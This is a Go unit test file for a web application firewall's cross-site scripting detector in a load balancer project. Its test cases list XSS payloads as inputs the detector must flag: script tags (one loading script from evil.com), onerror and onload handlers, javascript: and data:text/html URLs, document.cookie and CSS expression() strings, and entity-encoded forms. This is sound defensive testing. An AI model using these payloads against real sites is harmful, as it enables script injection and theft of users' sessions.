package xss

import (
	"testing"

	"github.com/openloadbalancer/olb/internal/waf/detection"
)

func newCtx(query string) *detection.RequestContext {
	return &detection.RequestContext{
		DecodedQuery: query,
		BodyParams:   make(map[string]string),
		Headers:      make(map[string][]string),
		Cookies:      make(map[string]string),
	}
}

func TestXSSDetector_ScriptTag(t *testing.T) {
	d := New()
	attacks := []string{
		"<script>alert(1)</script>",
		"<SCRIPT>alert(1)</SCRIPT>",
		"<ScRiPt>alert(1)</sCrIpT>",
		"<script src=http://evil.com/xss.js>",
	}

	for _, input := range attacks {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		if len(findings) == 0 {
			t.Errorf("expected XSS detection for %q", input)
		}
		for _, f := range findings {
			if f.Score < 80 {
				t.Errorf("expected high score for script tag, got %d for %q", f.Score, input)
			}
		}
	}
}

func TestXSSDetector_EventHandlers(t *testing.T) {
	d := New()
	attacks := []string{
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"<div onmouseover=alert(1)>",
	}

	for _, input := range attacks {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		if len(findings) == 0 {
			t.Errorf("expected XSS detection for %q", input)
		}
	}
}

func TestXSSDetector_Protocols(t *testing.T) {
	d := New()
	attacks := []string{
		"javascript:alert(1)",
		"vbscript:msgbox",
		"data:text/html,<script>alert(1)</script>",
	}

	for _, input := range attacks {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		if len(findings) == 0 {
			t.Errorf("expected XSS detection for protocol %q", input)
		}
	}
}

func TestXSSDetector_BenignInputs(t *testing.T) {
	d := New()
	benign := []string{
		"Hello, World!",
		"The price is $19.99",
		"Use the < and > operators",
		"email@example.com",
	}

	for _, input := range benign {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		totalScore := 0
		for _, f := range findings {
			totalScore += f.Score
		}
		if totalScore >= 50 {
			t.Errorf("expected no significant XSS for benign %q, got score %d", input, totalScore)
		}
	}
}

func TestXSSDetector_DOMPatterns(t *testing.T) {
	d := New()
	domAttacks := []struct {
		name  string
		input string
	}{
		{"document.cookie", "document.cookie"},
		{"innerHTML", "element.innerhtml"},
		{"outerHTML", "element.outerhtml"},
		{"constructor", "constructor"},
		{"fromCharCode", "String.fromcharcode(65)"},
	}

	for _, tt := range domAttacks {
		t.Run(tt.name, func(t *testing.T) {
			ctx := newCtx(tt.input)
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected XSS detection for DOM pattern %q", tt.input)
			}
			for _, f := range findings {
				if f.Score < 30 {
					t.Errorf("expected score >= 30 for DOM pattern %q, got %d", tt.input, f.Score)
				}
			}
		})
	}
}

func TestXSSDetector_CSSExpression(t *testing.T) {
	d := New()
	expressions := []string{
		"expression(alert(1))",
		"background: expression (alert(document.cookie))",
		"EXPRESSION(alert(1))",
	}

	for _, input := range expressions {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		if len(findings) == 0 {
			t.Errorf("expected XSS detection for CSS expression %q", input)
		}
		for _, f := range findings {
			if f.Rule != "css_expression" {
				// could also match other rules, that's ok
				continue
			}
			if f.Score < 40 {
				t.Errorf("expected score >= 40 for expression(), got %d", f.Score)
			}
		}
	}
}

func TestXSSDetector_DataTextHTML(t *testing.T) {
	d := New()
	ctx := newCtx("data:text/html,<script>alert(1)</script>")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected XSS detection for data:text/html")
	}
	// The protocol detection should give higher score for data:text/html
	foundHighScore := false
	for _, f := range findings {
		if f.Score >= 75 {
			foundHighScore = true
		}
	}
	if !foundHighScore {
		t.Error("expected at least one finding with score >= 75 for data:text/html")
	}
}

func TestXSSDetector_DataProtocolPlain(t *testing.T) {
	d := New()
	ctx := newCtx("data:image/png;base64,iVBOR")
	findings := d.Detect(ctx)
	// data: without text/html should get lower score (60)
	for _, f := range findings {
		if f.Rule == "protocol:data" && f.Score >= 75 {
			t.Errorf("data:image/png should not get text/html elevated score, got %d", f.Score)
		}
	}
}

func TestDecodeHTMLEntities(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"decimal entity", "&#60;script&#62;", "<script>"},
		{"hex entity", "&#x3c;script&#x3e;", "<script>"},
		{"mixed", "&#60;img &#x6f;nerror=alert(1)&#62;", "<img onerror=alert(1)>"},
		{"no entities", "hello world", "hello world"},
		{"incomplete entity", "&#60hello", "&#60hello"},
		{"uppercase hex", "&#X3C;", "<"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := decodeHTMLEntities(tt.input)
			if got != tt.expected {
				t.Errorf("decodeHTMLEntities(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func TestXSSDetector_StandaloneEventHandlers(t *testing.T) {
	d := New()
	handlers := []string{
		"onclick=alert(1)",
		"onerror =alert(1)",
		"onmouseover=alert(1)",
		"onfocus=alert(1)",
	}

	for _, input := range handlers {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		if len(findings) == 0 {
			t.Errorf("expected XSS detection for event handler %q", input)
		}
	}
}

func TestXSSDetector_TagWithEventHandler(t *testing.T) {
	d := New()
	ctx := newCtx("<img src=x onerror=alert(1)>")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected XSS detection for img tag with onerror")
	}
	// Score should be elevated (tag + event handler)
	for _, f := range findings {
		if f.Score >= 70 {
			return // found a high-score finding
		}
	}
	t.Error("expected at least one finding with score >= 70 for tag + event handler combo")
}

func TestXSSDetector_EmptyInput(t *testing.T) {
	d := New()
	ctx := newCtx("")
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Errorf("expected no findings for empty input, got %d", len(findings))
	}
}

func TestXSSDetector_JavascriptProtocol(t *testing.T) {
	d := New()
	ctx := newCtx("javascript:void(0)")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for javascript: protocol")
	}
}

func TestXSSDetector_VBScriptProtocol(t *testing.T) {
	d := New()
	ctx := newCtx("vbscript:msgbox")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for vbscript: protocol")
	}
}

func TestXSSDetector_MultipleFields(t *testing.T) {
	d := New()
	ctx := &detection.RequestContext{
		DecodedQuery: "<script>alert(1)</script>",
		DecodedPath:  "/page",
		DecodedBody:  "onerror=alert(2)",
		BodyParams: map[string]string{
			"input": "javascript:void(0)",
		},
		Headers: map[string][]string{
			"X-Custom": {"<img src=x onerror=alert(3)>"},
		},
		Cookies: map[string]string{
			"payload": "<svg onload=alert(4)>",
		},
	}

	findings := d.Detect(ctx)
	if len(findings) < 3 {
		t.Errorf("expected at least 3 findings from multiple fields, got %d", len(findings))
	}
}

func TestHexVal(t *testing.T) {
	tests := []struct {
		input    rune
		expected rune
	}{
		{'0', 0}, {'9', 9},
		{'a', 10}, {'f', 15},
		{'A', 10}, {'F', 15},
		{'g', 0}, {'z', 0},
	}

	for _, tt := range tests {
		got := hexVal(tt.input)
		if got != tt.expected {
			t.Errorf("hexVal(%q) = %d, want %d", tt.input, got, tt.expected)
		}
	}
}

func TestIsEventHandler(t *testing.T) {
	if !isEventHandler("onclick") {
		t.Error("expected onclick to be an event handler")
	}
	if !isEventHandler("ONERROR") {
		t.Error("expected ONERROR to be an event handler (case-insensitive)")
	}
	if isEventHandler("notanevent") {
		t.Error("expected notanevent to not be an event handler")
	}
}

func TestTruncate(t *testing.T) {
	short := truncate("hello", 80)
	if short != "hello" {
		t.Errorf("expected 'hello', got %q", short)
	}

	// Test with multi-byte characters
	longStr := "This is a fairly long string that should get truncated by the truncate function at eighty characters"
	result := truncate(longStr, 80)
	if len([]rune(result)) != 83 { // 80 + len("...")
		t.Errorf("expected truncated length 83 runes, got %d", len([]rune(result)))
	}
}
